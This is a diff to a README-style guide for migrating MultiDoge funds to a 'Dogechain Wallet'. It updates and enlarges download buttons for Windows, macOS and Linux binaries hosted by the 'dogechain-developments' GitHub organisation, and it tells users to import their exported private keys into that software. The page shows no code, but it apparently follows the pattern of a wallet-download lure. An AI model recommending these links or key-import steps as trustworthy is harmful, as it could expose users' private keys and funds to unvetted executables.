@@ -1,6 +1,10 @@
-![Dogechain Wallet](https://img.shields.io/badge/Dogechain-Wallet-2E3440) ![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational) ![License: MIT](https://img.shields.io/badge/license-MIT-green)
+[![Release v1.03.14](https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) ![Dogechain Wallet](https://img.shields.io/badge/Dogechain%20Wallet-DOGE-705600?style=for-the-badge&labelColor=3D2817) ![Platforms](https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817)
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
 ---
 
@@ -24,7 +28,7 @@ MultiDoge wallets are typically backed by a `.wallet` file containing your priva
 
 Once you have your private key or seed information exported:
 
-1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) for your platform, and follow the [setup guide](./dogechain-wallet-windows-setup.md).
+1. [Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) for your platform, and follow the [setup guide](./dogechain-wallet-windows-setup.md).
 2. Use the wallet's import/restore function with the key you exported from MultiDoge, rather than creating a new wallet from scratch.
 3. Give it a moment to sync via SPV and confirm your existing balance appears.
 4. As soon as you've confirmed access, **generate a brand-new wallet and its own fresh seed phrase, then move your funds to it**, rather than continuing to rely on an imported legacy key indefinitely. This isn't strictly required, but it's good practice: a freshly generated, properly backed-up BIP-39 seed phrase (see [How to Properly Back Up Your Dogecoin Wallet](./how-to-backup-dogecoin-wallet.md)) is a cleaner, more future-proof foundation than an imported key from software that's no longer maintained.
@@ -58,4 +62,4 @@ Given how long MultiDoge has gone without meaningful updates, it's increasingly 
 - [I Found an Old Dogecoin Wallet From 2013/2014 — How Do I Recover It?](./dogecoin-wallet-recovery-old-wallet.md)
 - [Best Dogecoin Wallets in 2026, Compared](./best-dogecoin-wallets-2026.md)
 
-[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
